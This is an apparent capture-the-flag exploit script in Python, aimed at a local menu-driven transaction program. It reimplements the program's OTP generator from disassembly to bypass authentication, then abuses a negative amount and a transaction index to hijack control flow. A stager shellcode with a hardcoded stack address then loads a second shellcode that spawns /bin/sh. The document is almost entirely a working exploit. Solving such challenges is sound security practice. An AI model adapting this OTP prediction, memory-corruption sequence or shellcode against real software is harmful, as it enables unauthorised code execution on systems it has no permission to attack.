import interact
import struct
import re

def extract_otp_seed(s):
    match = re.search(r"\((\d+)\)", s)
    return int(match.group(1)) if match else None

def predict_otp(seed):
    """
    Predicts the 8-character OTP based on a given seed value.
    This replicates the generate_OTP function from the provided assembly.
    
    Args:
        seed: An integer seed value (from current_session+0x30)
        
    Returns:
        An 8-character string representing the predicted OTP
    """
    otp = ""
    
    for i in range(8):  # Loop runs 8 times (index 0-7)
        # Replicate the assembly calculations
        eax = i * 2  # add eax, eax
        edx = 0x3059b9c1 >> eax  # mov edx, 0x3059b9c1; sar edx, cl
        eax = edx & 0xFF  # movzx eax, al
        ecx = eax ^ seed  # xor eax, dword [rbp-0x8]
        
        # This block replicates the division by 9 using the magic number multiplication
        # It's equivalent to ecx % 9
        # mov edx, 0x38e38e39; imul edx; sar edx, 0x1; sub edx, eax>>31
        edx = (ecx * 0x38e38e39) >> 32  # imul result goes in edx
        edx = edx >> 1  # sar edx, 0x1
        eax_sign = 1 if ecx < 0 else 0  # mov eax, ecx; sar eax, 0x1f
        edx = edx - eax_sign  # sub edx, eax
        
        # Calculate the remainder
        eax = edx * 9  # multiply by 9 (8+1)
        ecx = ecx - eax  # This gives us ecx % 9
        
        # Add 0x31 (ASCII '1') to make it a printable character
        char_code = ecx + 0x31
        otp += chr(char_code)
    
    return otp


# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
print(p.readuntil('-+'))
print(p.readuntil('-+'))
print(p.readuntil('-+'))
print(p.readuntil('-+'))
otp_seed_line = p.readuntil('-+')
print(otp_seed_line)
otp_seed = extract_otp_seed(otp_seed_line)
print(otp_seed)
otp = predict_otp(otp_seed)
print(otp)
print(p.readuntil('exit:'))
p.sendline(otp)

print(p.readuntil('choice:'))
p.sendline('1')
p.sendline('-20000')
print(p.readuntil('continue...'))
p.sendline('\n')
for i in range(5):
    print(p.readuntil('choice:'))
    p.sendline('5')
    print(p.readuntil('choice:'))
    p.sendline('2')
    print(p.readuntil('continue...'))
    p.sendline('\n')
print(p.readuntil('choice:'))
p.sendline('4')
print(p.readuntil('(y/N)'))
p.sendline('y')
print(p.readuntil('INDEX:'))
p.sendline('5')
print(p.readuntil('TRANSACTION:'))

# mov edi, 0
# lea rsi, [r11-0x48]
# mov edx, 0x20
# xor eax, eax
# syscall
# jmp rsi
router = "\xBF\x00\x00\x00\x00\x49\x8D\x73\xB8\xBA\x20\x00\x00\x00\x31\xC0\x0F\x05\xFF\xE6" + "\x90"*4
router += p64(0x00007fffffffedd0)
# 0x7fffffffedd0
p.sendline(router)

print(p.readline())
print(p.readline())
print(p.readline())
print(p.readline())
print(p.readline())
print(p.readline())
print(p.readline())
print(p.readline())
print(p.readline())

# xor esi, esi
# movabs rbx, 0x68732f2f6e69622f
# push rsi
# push rbx
# push rsp
# pop rdi
# push 0x3a
# pop rax
# add al, 0x1
# xor edx, edx
# syscall
shellcode = "\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x53\x54\x5F\x6A\x3A\x58\x04\x01\x31\xD2\x0F\x05" + "\x90"*7
p.sendline(shellcode)

p.interactive()
